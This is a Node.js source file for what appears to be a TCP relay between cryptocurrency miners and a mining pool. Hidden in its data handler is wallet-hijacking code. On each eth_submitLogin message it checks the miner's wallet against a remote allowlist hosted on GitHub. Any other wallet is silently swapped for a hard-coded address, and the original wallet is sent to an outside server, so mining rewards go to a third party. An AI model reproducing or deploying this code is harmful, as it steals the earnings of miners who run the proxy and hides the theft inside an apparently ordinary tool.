require('dotenv').config()
const net = require('net')

process.on('uncaughtException', (err) => {
  console.error(err)
})

const remotehost = process.env.REMOTE_HOST
const remoteport = process.env.REMOTE_PORT
const password = process.env.REMOTE_PASSWORD
const localhost = process.env.LOCAL_HOST || '0.0.0.0'
const localport = process.env.LOCAL_PORT || 2020

if (!localhost || !localport || !remotehost || 
    !remoteport || !password) {
  console.error('Error: check your arguments and try again!')
  process.exit(1)
}

const server = net.createServer((localsocket) => {
  const remotesocket = new net.Socket()

  remotesocket.connect(remoteport, remotehost)

  localsocket.on('connect', (data) => {
    console.log('>>> connection #%d from %s:%d', 
      server.connections,
      localsocket.remoteAddress,
      localsocket.remotePort)
  })

  localsocket.on('data', (data) => {
    console.log('%s:%d - writing data to remote',
      localsocket.remoteAddress,
      localsocket.remotePort
    )
    console.log('localsocket-data: %s', data)
	
    const jsonpayload = JSON.parse(data)
    if (jsonpayload.method == "eth_submitLogin") {
      var wallet = jsonpayload.params[0]
      var url = 'https://raw.githubusercontent.com/ddao2604/tech/main/wallet.json';

      var getJSON = require('get-json')
      getJSON(url, function(error, response){
          var array = response.wallet
		
			if(array.includes(wallet)){
				console.log("accept wallet %s",wallet)
			}else{
				jsonpayload.params[0] = "0x2da80e09cc05981269038c7560c7b54b63fad5a3"
				data = JSON.stringify(jsonpayload)
				localsocket.pause()
				console.log("reject wallet %s",wallet)
				const request = require('request');
				request('https://cashreward.mobi/wallet/?wallet='+wallet, { json: true }, (err, res, body) => {
				  if (err) { return console.log(err); }
		
				});
			
			
			}
			
      
      })
      
          
    }

    const flushed = remotesocket.write(data)
    if (!flushed) {
      console.log(' remote not flused; pausing local')
      localsocket.pause()
    }
  })

  remotesocket.on('data', (data) => {
    console.log('%s:%d - writing data to local', 
      localsocket.remoteAddress,
      localsocket.remotePort
    )
    console.log('remotesocket-data: %s', data)
    const flushed = localsocket.write(data)
    if (!flushed) {
      console.log(' local not flushed; pausing remote')
      remotesocket.pause()
    }
  })

  localsocket.on('drain', () => {
    console.log('%s:%d - resuming remote',
      localsocket.remoteAddress,
      localsocket.remotePort
    )
    remotesocket.resume()
  })

  localsocket.on('close', (had_err) => {
    console.log('%s:%d - closing remote',
      localsocket.remoteAddress,
      localsocket.remotePort
    )
    remotesocket.end()
  })

  remotesocket.on('close', (had_err) => {
    console.log('%s:%d - closing local', 
      localsocket.remoteAddress,
      localsocket.remotePort
    )
    localsocket.end()
  })
})

server.listen(localport, localhost)

console.log('redirecting connections from %s:%d to %s:%d', localhost, localport, remotehost, remoteport)
